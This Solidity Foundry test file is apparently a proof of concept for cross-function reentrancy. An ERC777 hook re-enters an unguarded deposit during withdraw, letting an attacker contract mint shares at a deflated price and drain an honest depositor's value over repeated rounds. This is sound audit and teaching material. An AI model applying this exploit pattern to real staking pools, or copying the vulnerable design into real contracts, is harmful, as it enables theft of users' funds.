// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {HookToken, StakingPool, Attacker} from "../src/Sample2_CrossFnReentrancy.sol";

/// @notice PoC: cross-function reentrancy — `withdraw` holds the reentrancy
///         guard, but the unguarded `deposit` can be re-entered from the
///         ERC777 `tokensReceived` hook fired mid-withdraw while `totalShares`
///         is stale-high. The attacker mints shares at a deflated price and
///         directly dilutes (steals from) honest depositors.
///
/// Math (par price = 1e18, one attacker + one victim, both deposit 100 tokens):
///   withdraw(100e18 shares): pool balance 200→100, totalShares STALE at 200e18
///   intra-hook sharePrice = 100e18*1e18/200e18 = 0.5e18
///   re-enter deposit(100 tokens) → mints 200e18 shares (paid 100, got 200)
///   post-hook totalShares -= 100e18 → 300e18, pool balance 200 tokens
///   → attacker: 200e18 shares ≈ 133 tokens (deposited 100)
///   → victim:   100e18 shares ≈  66 tokens (deposited 100)  ← 33% stolen
contract Sample2_CrossFnReentrancyTest is Test {
    HookToken internal hook;
    StakingPool internal pool;
    Attacker internal attacker;

    address internal victim = makeAddr("victim");

    function setUp() public {
        hook = new HookToken();
        pool = new StakingPool(hook);
        attacker = new Attacker(pool);

        // Victim (honest depositor): 100 tokens → 100e18 shares @ par
        hook.mint(victim, 100e18);
        vm.startPrank(victim);
        hook.approve(address(pool), type(uint256).max);
        pool.deposit(100e18);
        vm.stopPrank();

        assertEq(pool.sharePrice(), 1e18, "par before attack");
    }

    function test_endToEnd_dilution() public {
        // Attacker deposits 100 tokens from its own contract (hook registered).
        vm.prank(attacker.owner());
        attacker.stake(100e18);
        assertEq(pool.sharesOf(address(attacker)), 100e18, "attacker in at par");

        uint256 victimShares = pool.sharesOf(victim); // 100e18

        // Trigger: withdraw → hook re-enters deposit at the deflated price.
        vm.prank(attacker.owner());
        attacker.unstake(100e18);

        // Attacker exits the round holding 200e18 shares (paid for 100e18).
        assertEq(pool.sharesOf(address(attacker)), 200e18, "attacker doubled shares");

        // In token terms the attacker now owns ~2/3 of a 200-token pool:
        uint256 attackerValue = (pool.sharesOf(address(attacker)) * pool.sharePrice()) / 1e18;
        assertGt(attackerValue, 100e18, "attacker extracted more than deposited");

        // Victim's 100 tokens are now worth ~66 tokens — direct loss:
        uint256 victimValue = (victimShares * pool.sharePrice()) / 1e18;
        assertLt(victimValue, 100e18, "victim lost value");
        emit log_named_uint("victim underlying value (was 100e18)", victimValue);
        emit log_named_uint("attacker underlying value (paid 100e18)", attackerValue);
    }

    /// Repeat rounds drain the pool asymptotically toward 100% attacker-owned.
    function test_repeatable_untilPoolDrained() public {
        vm.prank(attacker.owner());
        attacker.stake(100e18);

        for (uint256 i; i < 3; ++i) {
            uint256 s = pool.sharesOf(address(attacker));
            vm.prank(attacker.owner());
            attacker.unstake(s / 2); // keep half in, compound the discount
        }

        uint256 attackerValue = (pool.sharesOf(address(attacker)) * pool.sharePrice()) / 1e18;
        uint256 totalUnderlying = hook.balanceOf(address(pool));
        emit log_named_uint("attacker share of pool (basis pts)", (attackerValue * 10_000) / totalUnderlying);
        assertGt(attackerValue, 150e18, "attacker compounded past 1.5x");
    }
}
